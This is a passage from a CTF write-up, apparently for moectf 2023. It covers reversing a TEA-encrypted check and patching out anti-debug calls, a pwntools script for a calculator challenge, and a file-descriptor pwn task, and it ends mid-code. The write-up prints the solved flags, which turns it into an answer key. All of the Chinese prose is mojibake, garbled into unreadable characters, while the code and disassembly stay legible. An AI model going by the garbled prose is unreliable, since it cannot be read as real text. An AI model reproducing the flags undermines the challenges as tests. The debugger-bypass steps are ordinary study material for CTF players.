class="line">.text:<span class="number">0041186</span>A                 pop     edi</span><br><span class="line">.text:<span class="number">0041186B</span>                 pop     esi</span><br><span class="line">.text:<span class="number">0041186</span>C                 pop     ebx</span><br><span class="line">.text:<span class="number">0041186</span>D                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:<span class="number">00411870</span>                 xor     ecx, ebp        ; StackCookie</span><br><span class="line">.text:<span class="number">00411872</span>                 call    j_@__security_check_cookie@<span class="number">4</span> ; __security_check_cookie(x)</span><br><span class="line">.text:<span class="number">00411877</span>                 add     esp, <span class="number">0</span>D0h</span><br><span class="line">.text:<span class="number">0041187</span>D                 cmp     ebp, esp</span><br><span class="line">.text:<span class="number">0041187F</span>                 call    j___RTC_CheckEsp</span><br><span class="line">.text:<span class="number">00411884</span>                 mov     esp, ebp</span><br><span class="line">.text:<span class="number">00411886</span>                 pop     ebp</span><br><span class="line">.text:<span class="number">00411887</span>                 retn</span><br><span class="line">.text:<span class="number">00411887</span> sub_411820      endp</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒä¸ªå¼‚å¸¸çš„ä½ç½®å°±æ˜¯åœ¨è¿™é‡Œï¼Œint3æ˜¯ x86é‡Œé¢çš„ä¸€ä¸ªè½¯ä¸­æ–­æŒ‡ä»¤ï¼Œç”¨æ¥è§¦å‘æ–­ç‚¹å¼‚å¸¸ï¼Œè°ƒè¯•å™¨ä¼šç”¨è¿™ä¸ªint3å®ç°æ–­ç‚¹åŠŸèƒ½(è¿™æœ‰ä¸ªå‘ï¼Œå…³äºåŠ¨æ€è°ƒè¯•çš„)</p>
<p>ç„¶åå¾—å‡ºçš„é€»è¾‘æ˜¯ inputString char[] 64è¿™ä¹ˆä¸€ä¸ªæ•°æ® -&gt; åˆ†æˆå…«ä¸ªç­‰é•¿çš„å­ä¸² -&gt;å‰å››ä¸ªä½¿ç”¨tea1å’Œkey[]æ•°ç»„åŠ å¯†-&gt;åå››ä¸ªä½¿ç”¨tea2å’Œkey[]æ•°ç»„åŠ å¯†-&gt; cmp inputString flagString -&gt; jz flag success</p>
<p>å¤§æ¦‚æ˜¯è¿™ä¹ˆä¸€ä¸ªé€»è¾‘</p>
<p>é‡åˆ°çš„ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œè¿™ä¸ªtea1å’Œtea2å…¶å®æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œcallçš„æ—¶å€™å’±æ²¡çœ‹æ¸…æ¥šå‡½æ•°åå­—(åç¼–è¯‘æ’ä»¶æ˜¾ç¤ºæœ‰äº›é—®é¢˜ï¼Œå°±å»è·Ÿç€ä¸¤ä¸ªtea encodeå†™äº†ä¸€éä»£ç qaq ã€‚ä¸è¿‡å‘ç°åœ¨åˆ†æç®—æ³•çš„æ—¶å€™ï¼Œä¸€å¼€å§‹æ€»ç‚¹å…³æ³¨å¯¹è¾“å…¥è¾“å‡ºæ˜¯æ€ä¹ˆæ ·çš„ä¸€ä¸ªå¤„ç†æµç¨‹ï¼Œç„¶åå†ç»™åç§»åœ°å€å…¨éƒ¨æ‰“ä¸Šæ ‡ç­¾ï¼Œç„¶åå°±èƒ½å¾ˆå¿«åˆ†ææ¸…æ¥šäº†qaq)</p>
<p>ç„¶åå†™äº†decodeä¹‹åæ€ä¹ˆè§£éƒ½æ˜¯åªèƒ½è§£å‡ºå‰åŠæ®µï¼Œçœ‹æ¥çœ‹å»é€»è¾‘éƒ½æ²¡æœ‰é—®é¢˜ï¼Œè°ƒè¯•çš„è¯å°±ä¼šè«åå…¶å¦™çš„é—ªé€€</p>
<p>ä»mainå¼€å§‹å¾€ä¸‹å•æ­¥ä¼šå‘ç°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0041589</span>A                 call    j_@__CheckForDebuggerJustMyCode@<span class="number">4</span> ; __CheckForDebuggerJustMyCode(x)</span><br><span class="line">.text:<span class="number">0041589F</span>                 call    sub_4113E3</span><br><span class="line">.text:<span class="number">004158</span>A4                 mov     esi, esp</span><br><span class="line">.text:<span class="number">004158</span>A6                 push    offset Buffer   ; <span class="string">&quot;Welcome to moectf2023!!! Now you find Y&quot;</span>...</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œåˆ°4113E3å°±ä¼šé—ªé€€ï¼Œè·Ÿè¿›å»çœ‹ä¸€ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">004117B</span>7                 push    offset ModuleName ; <span class="string">&quot;Ntdll&quot;</span></span><br><span class="line">.text:<span class="number">004117B</span>C                 call    ds:GetModuleHandleA</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:004117FF                 .text:004117FF                 call    [ebp+var_14]</span><br></pre></td></tr></table></figure>

<p>å‘ç°è¿™é‡Œé¢åŠ è½½äº†ntdll ï¼Œç„¶ååœ¨è¿™é‡Œcall    [ebp+var_14]é€€å‡ºäº†æŠŠè¿™ä¸ªsub_4113E3 nopæ‰å‘ç°èƒ½å¾€ä¸‹è°ƒè¯•äº†</p>
<p>ä¸‹é¢ä½œç”¨ç±»ä¼¼äºscanf è·å–è¾“å…¥çš„å‡½æ•°é‡Œé¢ä¹Ÿä¼šé—ªé€€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00411890</span> ; <span class="type">int</span> __cdecl <span class="title function_">sub_411890</span><span class="params">(<span class="type">char</span> *Format, <span class="type">char</span>)</span></span><br><span class="line">.text:00411890 sub_411890      proc near               ; CODE XREF: sub_4113CAâ†‘j</span><br><span class="line">.text:<span class="number">00411890</span></span><br><span class="line">.text:<span class="number">00411890</span> Format          = dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">00411890</span> arg_4           = byte ptr  <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">00411890</span></span><br><span class="line">.text:<span class="number">00411890</span>                 push    ebp</span><br><span class="line">.text:<span class="number">00411891</span>                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">00411893</span>                 sub     esp, <span class="number">0</span>C0h</span><br><span class="line">.text:<span class="number">00411899</span>                 push    ebx</span><br><span class="line">.text:<span class="number">0041189</span>A                 push    esi</span><br><span class="line">.text:<span class="number">0041189B</span>                 push    edi</span><br><span class="line">.text:<span class="number">0041189</span>C                 mov     edi, ebp</span><br><span class="line">.text:<span class="number">0041189</span>E                 xor     ecx, ecx</span><br><span class="line">.text:<span class="number">004118</span>A0                 mov     eax, <span class="number">0</span>CCCCCCCCh</span><br><span class="line">.text:<span class="number">004118</span>A5                 rep stosd</span><br><span class="line">.text:<span class="number">004118</span>A7                 mov     ecx, offset unk_41C063</span><br><span class="line">.text:<span class="number">004118</span>AC                 call    j_@__CheckForDebuggerJustMyCode@<span class="number">4</span> ; __CheckForDebuggerJustMyCode(x)</span><br><span class="line">.text:<span class="number">004118B</span>1                 call    sub_4113E3</span><br><span class="line">.text:<span class="number">004118B</span>6                 mov     eax, dword ptr [ebp+arg_4]</span><br><span class="line">.text:<span class="number">004118B</span>9                 push    eax             ; <span class="type">char</span></span><br><span class="line">.text:<span class="number">004118B</span>A                 mov     ecx, [ebp+Format]</span><br><span class="line">.text:<span class="number">004118B</span>D                 push    ecx             ; Format</span><br><span class="line">.text:<span class="number">004118B</span>E                 call    sub_4113C5</span><br><span class="line">.text:<span class="number">004118</span>C3                 add     esp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">004118</span>C6                 pop     edi</span><br><span class="line">.text:<span class="number">004118</span>C7                 pop     esi</span><br><span class="line">.text:<span class="number">004118</span>C8                 pop     ebx</span><br><span class="line">.text:<span class="number">004118</span>C9                 add     esp, <span class="number">0</span>C0h</span><br><span class="line">.text:<span class="number">004118</span>CF                 cmp     ebp, esp</span><br><span class="line">.text:<span class="number">004118</span>D1                 call    j___RTC_CheckEsp</span><br><span class="line">.text:<span class="number">004118</span>D6                 mov     esp, ebp</span><br><span class="line">.text:<span class="number">004118</span>D8                 pop     ebp</span><br><span class="line">.text:<span class="number">004118</span>D9                 retn</span><br><span class="line">.text:<span class="number">004118</span>D9 sub_411890      endp</span><br></pre></td></tr></table></figure>

<p>call    sub_4113E3 è¿™ä¸ªåœ°æ–¹ï¼Œä¸‹é¢è¿˜æœ‰ä¸ªcallé‚£ä¸ªæ˜¯è·å–è¾“å…¥çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">004117B</span>7                 push    offset ModuleName ; <span class="string">&quot;Ntdll&quot;</span></span><br><span class="line">.text:<span class="number">004117B</span>C                 call    ds:GetModuleHandleA</span><br><span class="line">    </span><br><span class="line">.text:<span class="number">004117F</span>1                 call    ds:GetCurrentThread</span><br><span class="line">     </span><br><span class="line">.text:<span class="number">004117F</span>F                 call    [ebp+var_14]</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¹ŸåŠ è½½äº†ntdll è·å–äº†çº¿ç¨‹ï¼Œåœ¨call    [ebp+var_14] è¿™æ–­æ‰äº†ï¼Œnopæ‰call    sub_4113E3åç¨‹åºèƒ½æ­£å¸¸è°ƒè¯•äº†</p>
<p>ä¸Šé¢è¯´çš„å‘æ˜¯ï¼Œåœ¨nopæ‰è¿™äº›ä¸œè¥¿åå¼€å§‹è°ƒè¯•ç¨‹åºï¼Œä»–åªèƒ½ä»startå¼€å§‹ï¼Œstarté‡Œé¢æœ‰ä¸€ä¸ªint3ï¼Œæˆ‘çœ‹è¿™ä¸ªä¹Ÿæ²¡æœ‰ä»€ä¹ˆå½±å“ï¼Œå°±ç»™ä»–æŠ›å‡ºäº†ï¼Œåé¢åˆ°äº†ç¨‹åºé€»è¾‘é‡Œé¢ï¼Œç¨‹åºé€»è¾‘é‡Œé¢ä¹Ÿæœ‰ä¸ªint3ï¼Œidaè‡ªåŠ¨ç»™æˆ‘æŠ›å‡ºäº†ã€‚ä¸€å¼€å§‹starté‚£ä¸æŠ›å‡ºint3ä»–å°±æ²¡æœ‰ä»€ä¹ˆé—®é¢˜</p>
<p>åŠ¨æ€äº†ä¹‹åæ‰çŸ¥é“ï¼ŒinputString å32ä½ encodeäº†ä¸¤æ¬¡ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡å†™è„šæœ¬åªèƒ½è§£å‡ºä¸€åŠ</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    v0, v1 = ciphertext</span><br><span class="line">    k0, k1, k2, k3 = key</span><br><span class="line">    sum_ = <span class="number">0xC6EF3720</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum_) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum_) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        sum_ -= <span class="number">0x9E3779B9</span></span><br><span class="line">        sum_ = sum_ &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> (v0, v1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_to_integers</span>(<span class="params">key_str</span>):</span><br><span class="line">    padded_key = key_str.ljust(<span class="number">16</span>, <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">tuple</span>(<span class="built_in">int</span>.from_bytes(padded_key[i:i+<span class="number">4</span>].encode(), <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(padded_key), <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">data_bytes_to_tuples</span>(<span class="params">data_bytes</span>):</span><br><span class="line">    data_list = [<span class="built_in">int</span>.from_bytes(data_bytes[i:i+<span class="number">4</span>], <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data_bytes), <span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">zip</span>(data_list[::<span class="number">2</span>], data_list[<span class="number">1</span>::<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tuples_to_bytes</span>(<span class="params">data_tuples</span>):</span><br><span class="line">    byte_list = [item.to_bytes(<span class="number">4</span>, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> sublist <span class="keyword">in</span> data_tuples <span class="keyword">for</span> item <span class="keyword">in</span> sublist]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(byte_list)</span><br><span class="line"></span><br><span class="line">keys = [<span class="string">&quot;DX3906&quot;</span>, <span class="string">&quot;doctor3&quot;</span>, <span class="string">&quot;FUX1AOYUN&quot;</span>, <span class="string">&quot;R3verier&quot;</span>]</span><br><span class="line">key_integers = [key_to_integers(key) <span class="keyword">for</span> key <span class="keyword">in</span> keys]</span><br><span class="line"></span><br><span class="line">flag1 = [<span class="number">90</span>, <span class="number">227</span>, <span class="number">107</span>, <span class="number">228</span>, <span class="number">6</span>, <span class="number">135</span>, <span class="number">2</span>, <span class="number">79</span>, <span class="number">67</span>, <span class="number">223</span>, <span class="number">205</span>, <span class="number">193</span>, <span class="number">119</span>, <span class="number">152</span>, <span class="number">107</span>, <span class="number">219</span>, <span class="number">143</span>, <span class="number">56</span>, <span class="number">67</span>, <span class="number">153</span>, <span class="number">227</span>, <span class="number">147</span>, <span class="number">34</span>, <span class="number">181</span>, <span class="number">35</span>, <span class="number">253</span>, <span class="number">176</span>, <span class="number">28</span>, <span class="number">229</span>, <span class="number">227</span>, <span class="number">238</span>, <span class="number">206</span>]</span><br><span class="line">flag2 = [<span class="number">47</span>, <span class="number">29</span>, <span class="number">173</span>, <span class="number">43</span>, <span class="number">164</span>, <span class="number">21</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">216</span>, <span class="number">235</span>, <span class="number">37</span>, <span class="number">250</span>, <span class="number">107</span>, <span class="number">33</span>, <span class="number">183</span>, <span class="number">114</span>, <span class="number">185</span>, <span class="number">3</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">217</span>, <span class="number">76</span>, <span class="number">235</span>, <span class="number">123</span>, <span class="number">245</span>, <span class="number">167</span>, <span class="number">72</span>, <span class="number">249</span>, <span class="number">144</span>, <span class="number">157</span>, <span class="number">56</span>, <span class="number">252</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag1 decode</span></span><br><span class="line">f1 = data_bytes_to_tuples(flag1)</span><br><span class="line">decrypted_data_list_1 = [decrypt(data_tuple, key_integer) <span class="keyword">for</span> data_tuple, key_integer <span class="keyword">in</span> <span class="built_in">zip</span>(f1, key_integers)]</span><br><span class="line">decrypted_bytes_1 = tuples_to_bytes(decrypted_data_list_1)</span><br><span class="line">decrypted_string_1 = decrypted_bytes_1.decode(errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag2 decode1</span></span><br><span class="line">f2 = data_bytes_to_tuples(flag2)</span><br><span class="line">decrypted_data_list_2_1st = [decrypt(data_tuple, key_integer) <span class="keyword">for</span> data_tuple, key_integer <span class="keyword">in</span> <span class="built_in">zip</span>(f2, key_integers)]</span><br><span class="line">decrypted_bytes_2_1st = tuples_to_bytes(decrypted_data_list_2_1st)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag2 decode2</span></span><br><span class="line">f2_2nd = data_bytes_to_tuples(decrypted_bytes_2_1st)</span><br><span class="line">decrypted_data_list_2_2nd = [decrypt(data_tuple, key_integer) <span class="keyword">for</span> data_tuple, key_integer <span class="keyword">in</span> <span class="built_in">zip</span>(f2_2nd, key_integers)]</span><br><span class="line">decrypted_bytes_2_2nd = tuples_to_bytes(decrypted_data_list_2_2nd)</span><br><span class="line">decrypted_string_2_2nd = decrypted_bytes_2_2nd.decode(errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line"></span><br><span class="line">result = decrypted_string_1 + decrypted_string_2_2nd</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag moectf{WoOo00Oow_S0_interesting_y0U_C4n_C41l_M3tW1c3_BY_Unw1Nd~}</p>
<p>unwindæ ˆå±•å¼€çš„ä¾‹å­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdexcept&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassA</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">    ClassA() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ClassA constructed.\n&quot;</span>; &#125;</span><br><span class="line">    ~ClassA() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ClassA destructed.\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassB</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">    ClassB() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ClassB constructed.\n&quot;</span>; &#125;</span><br><span class="line">    ~ClassB() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ClassB destructed.\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassC</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">    ClassC() &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ClassC constructed.\n&quot;</span>;</span><br><span class="line">        throw <span class="built_in">std</span>::runtime_error(<span class="string">&quot;Exception from ClassC constructor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ~ClassC() &#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;ClassC destructed.\n&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        ClassA a;</span><br><span class="line">        ClassB b;</span><br><span class="line">        ClassC c;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (<span class="type">const</span> <span class="built_in">std</span>::exception&amp; e) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Caught exception: &quot;</span> &lt;&lt; e.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="EZNET-æœªè§£å†³-æ²¡æ€è·¯"><a href="#EZNET-æœªè§£å†³-æ²¡æ€è·¯" class="headerlink" title="EZNET[æœªè§£å†³-æ²¡æ€è·¯]"></a>EZNET[æœªè§£å†³-æ²¡æ€è·¯]</h2><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h2><p>æŸ¥çœ‹giftæç¤ºflagæ˜¯éšè—çš„ï¼Œls -al å‘ç°.flag cat</p>
<p>moectf{BEgOXB3-Sk6bTQrihNqE5rw4G46OQIHS}</p>
<h2 id="baby-calculator"><a href="#baby-calculator" class="headerlink" title="baby_calculator"></a>baby_calculator</h2><p>åé¢å‘ç°flagå‡ºä¸æ¥ï¼Œæ˜¯å› ä¸ºæœ‰ä¸ªæ¢è¡Œç¬¦ï¼Œrecvlineåˆ°æ¢è¡Œç¬¦å°±åœäº†ï¼Œç”¨recvrepeatè®¾ç½®ä¸ªè¶…æ—¶æ—¶é—´å°±è¯»å‡ºæ¥äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">pattern = <span class="string">r&quot;(\d+)\s*([\+\-\*\/])\s*(\d+)\s*=\s*(\d+)&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.144.193&#x27;</span>,<span class="number">56098</span>)</span><br><span class="line">p.recvregex(<span class="string">b&#x27;Now..start!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(p.recvline()) ; <span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line">    s = p.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">match</span> = re.search(pattern, s)</span><br><span class="line"></span><br><span class="line">    n1, operator, n2, r = <span class="keyword">match</span>.groups()</span><br><span class="line">    n1, n2 , r = <span class="built_in">int</span>(n1) ,<span class="built_in">int</span>(n2) , <span class="built_in">int</span>(r)</span><br><span class="line">    <span class="built_in">print</span>(n1, operator, n2, r)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> operator == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">        n1 = n1 + n2</span><br><span class="line">    <span class="keyword">elif</span> operator == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">        n1 = n1 - n2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(r == n1):</span><br><span class="line">        p.sendline(<span class="string">b&#x27;BlackBird\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="string">b&#x27;WingS\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvrepeat(<span class="number">5</span>))</span><br></pre></td></tr></table></figure>

<p>moectf{H4ve_y0u_rea11y_useD_Pwnt00ls??????}</p>
<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p><a target="_blank" rel="noopener" href="https://wiyi.org/linux-file-descriptor.html">https://wiyi.org/linux-file-descriptor.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/love-jelly-pig/p/10048483.html">https://www.cnblogs.com/love-jelly-pig/p/10048483.html</a></p>
<p>å»æŸ¥è¯¢äº†ä¸€ä¸‹èµ„æ–™ï¼Œå½“è¿›ç¨‹æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶å†…æ ¸ä¼šè¿”å›ä¸€ä¸ªFILE Descriptor,è¿›ç¨‹å¯ä»¥é€šè¿‡fdå¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œ</p>
<p>è¿™ä¸ªç¨‹åºçš„æ„æ€æ˜¯è¾“å…¥fd,ç„¶åé€šè¿‡fdè¯»æ•°æ®è¾“å‡ºï¼Œfd 0 1 2éƒ½è¢«ç³»ç»Ÿå ç”¨äº†åˆ†åˆ«æ˜¯stdin stdout stderr,æ‰€ä»¥3æ˜¯flagã€‚</p>
<p>fdè¢«é”€æ¯å‰é€šè¿‡dup2å‡½æ•°å°†æ–‡ä»¶æè¿°ç¬¦å¤åˆ¶åˆ°äº†new_fdã€‚new_fd &#x3D; 4 * 3 | 0x29Aã€‚new_fd &#x3D;670,æ‰€ä»¥åªéœ€è¦ä¼ å…¥670å°±èƒ½å°†flagè¯»å‡ºæ¥</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [rsp+4h] [rbp-6Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  <span class="type">int</span> new_fd; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  <span class="type">char</span> flag[<span class="number">80</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  input = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span 